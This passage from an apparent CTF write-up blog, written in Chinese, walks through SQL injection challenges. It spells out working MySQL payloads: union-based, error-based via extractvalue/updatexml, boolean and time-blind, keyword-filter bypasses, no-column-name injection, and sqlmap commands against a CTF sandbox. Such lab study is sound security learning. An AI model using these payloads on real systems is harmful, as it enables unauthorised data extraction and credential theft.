alt="image-20210617021123869"></p><p>由于select 1 from Flag 是增加一个临时列，它的列名是1，然后那一列的值都为1</p><p>因此在查询的flag后还有一个值为1的临时列</p><p><strong>解法二</strong></p><p>把&quot;||&quot;变成字符串连接符，而不是或。这里涉及到mysql中sql_mode参数设置，设置<code>sql_mode=pipes_as_concat</code>字符就可以设置。</p><p>payload：1;set sql_mode=PIPES_AS_CONCAT;select 1</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617021450142.png" alt="image-20210617021450142"></p><p>也能获得flag。</p><p>这是查询语句相当于select 1flag from Flag</p><p>(不太懂为啥这样也能查出来，1flag是列名如果Flag表里没有这一列呢？？)</p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>用到了联合查询</p><p><a href="https://www.cnblogs.com/guoqingsentou/p/13488796.html">原理篇——sql注入2：联合查询注入 - 这太秃然了 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/weixin_42277564/article/details/80583959">SQL注入之联合查询注入_selecthch的博客-CSDN博客_联合注入</a></p><p>参考一下</p><p>常规步骤</p><p>　            1. 判断注入点</p><p>　　　　2. 判断注入类型（数字型型or字符型）</p><p>　　　　3. 判断字段数</p><p>　　　　4. 判断回显位</p><p>　　　　5. 确定数据库名</p><p>　　　　6. 确定表名</p><p>　　　　7. 确定字段名</p><p>　　　　8. 拿到数据</p><p>1.判断注入点</p><p>​            在输入的用户名后添加单引号返回出错，猜测存在注入</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617122257987.png" alt="image-20210617122257987"></p><p>2.判断注入类型</p><p>​            在用户名后输入1’ or 1#后成功进入，但还是没有拿到flag，因此继续尝试注入</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617122350388.png" alt="image-20210617122350388"></p><p>3.判断字段数</p><p>​        当order by 4时出错，因此应有三个字段数</p><p>4.判断回显位</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617122732266.png" alt="image-20210617122732266"></p><p>5。确定数据库名</p><p>​        为了获取所有数据库名，要利用group_concat()函数令其一次性显示出来</p><pre class="language-none"><code class="language-none">1&#39; union select 1,2,group_concat(database());#</code></pre><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617123129571.png" alt="image-20210617123129571"></p><p>6.确定表名</p><pre class="language-none"><code class="language-none">1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();#</code></pre><p><strong>【INFORMATION_SCHEMA 数据库】</strong> 是MySQL自带的，它提供了访问数据库 <strong>元数据</strong> 的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p><p>常用字段</p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>Table_catalog</td><td>数据表登记目录</td></tr><tr><td>Table_schema</td><td>数据表所属的数据库名</td></tr><tr><td>Table_name</td><td>表名称</td></tr><tr><td>Table_type</td><td>表类型[system view|base table]</td></tr><tr><td>Engine</td><td>使用的数据库引擎[MyISAM|CSV|InnoDB]</td></tr><tr><td>Version</td><td>版本，默认值10</td></tr><tr><td>Row_format</td><td>行格式[Compact|Dynamic|Fixed]</td></tr><tr><td>Table_rows</td><td>表里所存多少行数据</td></tr><tr><td>Avg_row_length</td><td>平均行长度</td></tr><tr><td>Data_length</td><td>数据长度</td></tr><tr><td>Max_data_length</td><td>最大数据长度</td></tr><tr><td>Index_length</td><td>索引长度</td></tr><tr><td>Data_free</td><td>空间碎片</td></tr><tr><td>Auto_increment</td><td>做自增主键的自动增量当前值</td></tr><tr><td>Create_time</td><td>表的创建时间</td></tr><tr><td>Update_time</td><td>表的更新时间</td></tr><tr><td>Check_time</td><td>表的检查时间</td></tr><tr><td>Table_collation</td><td>表的字符校验编码集</td></tr><tr><td>Checksum</td><td>校验和</td></tr><tr><td>Create_options</td><td>创建选项</td></tr><tr><td>Table_comment</td><td>表的注释、备注</td></tr></tbody></table><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617123612820.png" alt="image-20210617123612820"></p><ol start="7"><li><p>确定字段名</p><p>猜测flag应该在l0ve1ysq1表中，因此查找该表内的字段名</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;;#</code></pre></li></ol><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617164130341.png" alt="image-20210617164130341"></p><p>8.拿到数据</p><p>查找这三列中的全部数据，利用group_concat();</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#;</code></pre><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617164638259.png" alt="image-20210617164638259"></p><p>得到flag</p><p><strong>MySQL默认有“information_schema”的数据库，该库中有三个表名：</strong></p><p>1、SCHEMATA：存储该用户创建的所有数据库的库名，记录库名的字段为SCHEMA_NAME。<br>2、TABLES：存储该用户创建的所有数据库的库名和表名，记录库名和表名的字段为TABLE_SCHEMA和TABLE_NAME。<br>3、COLUMNS：存储该用户创建的所有数据库的库名、表名和字段名，库名、表名和字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。</p><h2 id="ctfhub—SQL-整数型注入"><a href="#ctfhub—SQL-整数型注入" class="headerlink" title="ctfhub—SQL 整数型注入"></a>ctfhub—SQL 整数型注入</h2><p>输入1有回显</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617171453199.png" alt="image-20210617171453199"></p><p>输入1 and 1=2无回显，既存在注入点，整数型注入</p><p>利用order by可知存在两个字段</p><p>利用联合查询查询数据库名称</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617171639524.png" alt="image-20210617171639524"></p><p>再查找表名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617171824424.png" alt="image-20210617171824424"></p><p>flag应该就在flag表内，再查找字段名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617171902588.png" alt="image-20210617171902588"></p><p>最后得到flag</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617171939691.png" alt="image-20210617171939691"></p><h2 id="ctfhub—SQL字符型注入"><a href="#ctfhub—SQL字符型注入" class="headerlink" title="ctfhub—SQL字符型注入"></a>ctfhub—SQL字符型注入</h2><p>利用order by判断字段数</p><p>输入-1&#39; union select 1,2#判断回显位置</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617225730001.png" alt="image-20210617225730001"></p><p>查数据库名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617221940482.png" alt="image-20210617221940482"></p><p>查表名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617221849032.png" alt="image-20210617221849032"></p><p>查字段名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617224854046.png" alt="image-20210617224854046"></p><p>查flag        -1&#39; union select 1,group_concat(flag) from flag#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210617225605950.png" alt="image-20210617225605950"></p><p>感觉和整数型注入差不多</p><h2 id="ctfhub—报错注入"><a href="#ctfhub—报错注入" class="headerlink" title="ctfhub—报错注入"></a>ctfhub—报错注入</h2><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。</p><p><strong>extractvalue()</strong></p><pre class="language-none"><code class="language-none">函数原型：extractvalue(xml_document,Xpath_string)正常语法：extractvalue(xml_document,Xpath_string);第一个参数：xml_document是string格式，为xml文档对象的名称第二个参数：Xpath_string是xpath格式的字符串作用：从目标xml中返回包含所查询值的字符串</code></pre><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容</p><p>payload模板</p><pre class="language-none"><code class="language-none">&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))</code></pre><ol><li>0x7e=’~’</li><li>concat(‘a’,‘b’)=“ab”</li><li>version()=@@version</li><li> ‘~‘可以换成’#’、’$&#39;等不满足xpath格式的字符</li><li> extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li></ol><p>返回结果不能超过一条</p><p>若超过则需再查询语句后添加limit x,1或用group_concat()函数</p><p><strong>updatexml()</strong></p><p>updatexml()函数与extractvalue()类似，是更新xml文档的函数。</p><p>and 1=(updataxml(1,concat(0x7e,(sql_inject),0x7e),1))</p><p><strong>flood()</strong></p><p>原理还没看明白（</p><p>先放个模板在这</p><pre class="language-none"><code class="language-none">1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</code></pre><p><strong>题目：</strong></p><p><strong>利用extractvalue</strong></p><p>输入单引号提示语法错误，输入and 1=1能正确查询，猜测为数字型，利用extractvalue函数爆库名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618145637443.png" alt="image-20210618145637443"></p><p>再爆表名</p><p>这里提示太长因此利用group_concat()函数</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618150129458.png" alt="image-20210618150129458"></p><p>猜到flag再flag表内爆列名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618150241862.png" alt="image-20210618150241862"></p><p>最后查询内容</p><p>1 and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e))</p><p>由于extractvalue函数只能显示32位字符，所以要利用substring函数进行分割</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618150615881.png" alt="image-20210618150615881"></p><p>利用substring查看右边31位字符</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618181313759.png" alt="image-20210618181313759"></p><p>最后可以拿到flag</p><p>ctfhub{ff3bb0327849e1b9e0e6abfd}</p><p><strong>利用updataxml函数</strong></p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618181744673.png" alt="image-20210618181744673"></p><p><strong>利用flood函数</strong></p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618182036292.png" alt="image-20210618182036292"></p><h2 id="ctfhub—布尔盲注"><a href="#ctfhub—布尔盲注" class="headerlink" title="ctfhub—布尔盲注"></a>ctfhub—布尔盲注</h2><p>只有出现数据提交正确和错误两种不同的页面（报错型至少语法错误会回显错误到页面上）或者无法使用联合查询。</p><p><strong>步骤</strong></p><ol><li>用错误和正确两种反馈进行逐一试验，猜测出闭合</li><li>利用length来逐一测试字符串的长度</li><li>利用substr来逐一的测试，测试库名、表名、列名和其他数据</li><li>最后得到数据</li></ol><p>函数</p><pre class="language-none"><code class="language-none">length()返回字符串的长度length(abc)返回3，表示abc字符串长度为3substr()截取字符串substr(abc,1,1)返回a，从abc的第一位开始截取，步长为1mid()取出字符串的一部分值mid(abc,1,1)返回a，从abc的第一位开始取，步长为1，与substr()用法一致left()取出字符串左边的几个数据left(abc,1)返回aleft(abc,2)返回abright()取出右边的几个数据right(abc,1)返回cright(abc,2)返回bcord() 与ascii()返回一个字符的ascii码值ascii(s)返回114hex()返回16进制数</code></pre><p>先猜数据库长度&gt;3时返回成功，&gt;4时返回失败可以得到数据库名长度为4</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618213033658.png" alt="image-20210618213033658"></p><p>接下来利用substr和ascii函数猜名字</p><p>首字母ascii码大于114时返回成功，大于115时返回失败，可得到首字母的ascii码为115，为s</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618213347153.png" alt="image-20210618213347153"></p><p>第二位同理可以得到ascii码值为113，为q</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618213535384.png" alt="image-20210618213535384"></p><p>最后可得数据库名为sqli</p><p>再猜表名</p><p>1 and substr((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1),1,1)=&#39;n&#39;</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618214343490.png" alt="image-20210618214343490"></p><p>（感觉这部分应该用bp抓包爆破更方便）</p><p>吧limit后的0改为1猜第二个表名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618214721333.png" alt="image-20210618214721333"></p><p>最后能得到有news和flag两个表</p><p>再猜字段</p><p>首字母ascii码为102，为f</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618215609088.png" alt="image-20210618215609088"></p><p>同理能得到字段名为flag</p><p>最后爆内容</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618222859475.png" alt="image-20210618222859475"></p><p>太多了，用bp爆破完感觉也很难找，估计用py写脚本会方便很多</p><p><strong>用sqlmap：</strong></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> --dbs查库名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618224516739.png" alt="image-20210618224516739"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli --tables</p><p>查表名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618224721120.png" alt="image-20210618224721120"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli -T flag --columns查字段名</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618225207129.png" alt="image-20210618225207129"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli -T flag -C flag --dump查值</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210618225706653.png" alt="image-20210618225706653"></p><h2 id="ctfhub—时间盲注"><a href="#ctfhub—时间盲注" class="headerlink" title="ctfhub—时间盲注"></a>ctfhub—时间盲注</h2><p>利用sleep函数进行盲注</p><p>若and之前的语句正确则成功执行sleep</p><p>能得到是数字型注入</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619153620142.png" alt="image-20210619153620142"></p><p>接下来利用if语句进行注入是否成功的判断1 and if(查询语句,sleep(2),1)</p><p>若为真则执行sleep（2），若为假则执行1</p><p>接下来步骤与布尔盲注相似</p><p>猜数据库名（也可以利用ascii码来猜，但因为ctfhub的sql题名称都一样，就直接试字符了）</p><p>1 and if(substr(database(),1,1)=&#39;s&#39;,sleep(2),1)#</p><p>猜表的数量</p><p>1 and if((select count(table_name) from information_schema.tables  where table_schema=database())=2,sleep(2),1)#</p><p>猜表名</p><p>1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;0,sleep(2),1)#</p><p>将limit后的0改为1再猜第二个表名</p><p>分别为news 和 flag</p><p>猜flag表内字段数量</p><p>1 and if((select count(column_name) from information_schema.columns  where table_name=&#39;flag&#39;)=1,sleep(2),1)#</p><p>猜字段名</p><p>1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1),1,1))&gt;102,sleep(2),1)#</p><p>最终可以猜出字段名为flag</p><p>再猜内容</p><p>1 and if(ascii(substr((select flag from flag limit 0,1),1,1))&gt;99,sleep(2),1)#</p><p>这部分应该还是要用python或者sqlmap</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619160201466.png" alt="image-20210619160201466"></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>看题目就知道空格被过滤了，这里可以利用/**/注释符来替代空格，其他步骤和字符型注入一样</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210620113251958.png" alt="image-20210620113251958"></p><p>最后得到flag</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210620113632138.png" alt="image-20210620113632138"></p><p>贴个别人总结的过滤和绕过</p><p><a href="https://blog.csdn.net/weixin_44300286/article/details/96597167?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">SQL注入一些过滤及绕过总结_obsetear的博客-CSDN博客</a></p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>看到界面提示存在过滤</p><p>输入1&#39; and 1=1# 1‘ or 1#  1&#39; and select 1 from 1#等语句根据返回的错误信息可以知道过滤了select or and union from by where</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619173714989.png" alt="image-20210619173714989"></p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619173908385.png" alt="image-20210619173908385"></p><p>这里可以利用双写绕过，首先利用order by查字段数可以查到表内有三列</p><p>1&#39; oorrder bbyy 4;#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619174055661.png" alt="image-20210619174055661"></p><p>接下来可以利用联合查询</p><p>先看回显1&#39; ununionion selselectect 1,2,3;#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619174226243.png" alt="image-20210619174226243"></p><p>查库名1&#39; ununionion selselectect 1,2,database();#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619174351658.png" alt="image-20210619174351658"></p><p>查表名</p><p>1&#39; ununionion selselectect 1,2,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database());#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619174759820.png" alt="image-20210619174759820"></p><p>flag应该在b4bsql表里，爆一下列名</p><p>1&#39; ununionion selselectect 1,2,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;);#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619175029086.png" alt="image-20210619175029086"></p><p>最后爆内容1&#39; ununionion selselectect 1,2,(selselectect group_concat(id,username,passwoorrd) frfromom b4bsql);#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619175306597.png" alt="image-20210619175306597"></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>试了一下，and union 空格 等于都被过滤了尝试了几种绕过姿势都没成功，看了下别人的wp说是报错注入</p><p>利用括号来去掉查询语句中的空格</p><p>先查库</p><p>0&#39;or(extractvalue(1,concat(0x7e,(database()),0x7e)))#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619181915074.png" alt="image-20210619181915074"></p><p>再查表</p><p>由于等于号也被过滤了，所以要用like</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e)))#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619184507074.png" alt="image-20210619184507074"></p><p>爆列名</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e)))#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619184801079.png" alt="image-20210619184801079"></p><p>最后爆内容</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e)))#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619185705420.png" alt="image-20210619185705420"></p><p>flag{66f2f5cd-207d-4d50-87</p><p>由于extractvalue显示字符数的限制，要用substr函数对其进行分割</p><p>admin&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(id,username,password))from(H4rDsq1)),31),0x7e)))#</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619190153350.png" alt="image-20210619190153350"></p><p>cd-207d-4d50-87bd-d8b762ffce95}</p><p>最后拼一下得到flag</p><p>flag{66f2f5cd-207d-4d50-87bd-d8b762ffce95}</p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>进入后是个登录页面，注册个账号之后登录</p><p>可以知道注入点在广告位上</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619214559474.png" alt="image-20210619214559474"></p><p>试一下可以知道or and #都被过滤了</p><p>因为过滤了＃号，所以要保证后面的单引号能闭合</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;‘1’&#x3D;‘1</code></pre><p>得到回显位置2，3.</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619220207345.png" alt="image-20210619220207345"></p><p><strong>因为or被过滤，且无法通过大小写和双写绕过，那么information_schema因为含有or，所以也没法使用。</strong>这里有两种方法可以绕过</p><p><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">SQL注入：限制条件下获取表名、无列名注入 - MustaphaMond - 博客园 (cnblogs.com)</a></p><p>InnoDb引擎<br>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。<br>sys数据库<br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。</p><p>sys数据库需要root权限，而innoDb在mysql中默认关闭</p><p>限制：<br><strong>mysql ≥ 5.7版本</strong></p><p>先查一下数据库版本</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619221524942.png" alt="image-20210619221524942"></p><p>因此可以利用innoDb来查表名</p><p>系统Mysql库中存在两张与innodb相关的表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>。</p><p>所以可以通过查找这两个表取代information的作用</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>或</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_index_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>得到表名为ads和users</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619223630074.png" alt="image-20210619223630074"></p><p>猜flag在users表内，进行无列名注入</p><p><strong>无列名注入原理</strong></p><p>无列名注入的原理就是在取别名的同时查询数据。通过无列名查询构造一个虚拟表，在构造此表的同时查询其中的数据。</p><p>表的列数也要一次次试</p><p>（不太懂为啥这里的列数不是22)</p><p><a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入 - 知乎 (zhihu.com)</a></p><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">SWPU2019]Web1 - 王叹之 - 博客园 (cnblogs.com)</a></p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,(select&#x2F;**&#x2F;group_concat(&#96;3&#96;)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>如果反引号被过滤，就要对字段利用别名替代</p><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210619234252501.png" alt="image-20210619234252501"></p><p><strong>还可以利用join爆列名</strong></p><p>join后的列名是两个表列名加起来的，可能会产⽣相同的列名，如id和name，使⽤别名时，表中不能出现同的字段名，这就跟join第⼀个特点相冲突，所以在join和别名同时使⽤时会导致报错</p><p>当通过查询得到新的表时，必须有一个别名，即每个派生出来的表都必须有一个自己的别名</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p><strong>原理</strong></p><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p><strong>二次注入，可以概括为以下两步:</strong></p><ul><li>第一步：插入恶意数据<br> 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li><li>第二步：引用恶意数据<br> 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li></ul><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210621110912304.png" alt="image-20210621110912304"></p><h2 id="记考核赛的一次sql盲注"><a href="#记考核赛的一次sql盲注" class="headerlink" title="记考核赛的一次sql盲注"></a>记考核赛的一次sql盲注</h2><p><img src="/2021/06/16/buu-sql%E9%A2%98wp/image-20210821170913431.png" alt="image-20210821170913431"></p><p>(strcmp(ascii(substr(REVERSE(tceles)(table_name)from(mysql.innodb_table_stats)where((table_schema)like(database())),1,1)),10000))%23</p><p>||strcmp(ascii(substr((select(table_name)from(mysql.innodb_table_stats))where((database_name)like(database())),1,1)),1)%23</p><p>username=admin&amp;password=||((ascii(mid((pwd)from(1))))like(12))%23</p><p>YouAresOgOoD</p><p>select(table_name)from(information_schema.tables)where(table_schema=database())</p><p>||(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),§1§,1))=§0§)%23</p><p>flag_1s_her3</p><p>||(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f31735f68657233)),§1§,1))=§0§)%23</p><p>flag{sql1_1s_s0_ea3y}</p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>my-first-blog</title>
      <link href="/2021/06/15/my-first-blog/"/>
      <url>/2021/06/15/my-first-blog/</url>
      
        <content type="html"><![CDATA[<p>成功搭建blog<br>测试一下写博客</p>]]></content>
      
      
      
        <tags>
            
            <tag> test 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
